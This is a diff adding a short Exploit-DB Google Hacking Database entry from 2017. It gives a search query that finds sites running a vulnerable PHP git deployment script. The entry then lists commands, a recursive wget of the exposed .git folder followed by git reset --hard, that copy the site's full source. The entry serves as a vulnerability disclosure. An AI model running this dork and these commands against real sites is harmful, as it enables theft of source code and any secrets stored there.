@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/4593
+Category:         Advisories and Vulnerabilities
+Published Date:   2017-10-17
+Author:           anonymous
+GoogleDork:       filetype:php "Git Deployment Script v0.1"
+Description:      filetype:php "Git Deployment Script v0.1"
+
+
+Query : filetype:php "Git Deployment Script v0.1" Vulnerable php git deployment script : https://gist.github.com/oodavid/1809044 - Discloses all files not contained in the git repository - Most users do not secure their .git folder so you can clone their repo For a result [exemple.com/path/deploy.php](http://exemple.com/deploy.php) - wget -r -np exemple.com/path/.git/ - cd ./exemple.com/path/.git/ - git reset --hard - You have a copy of the website content - Cringe Nate
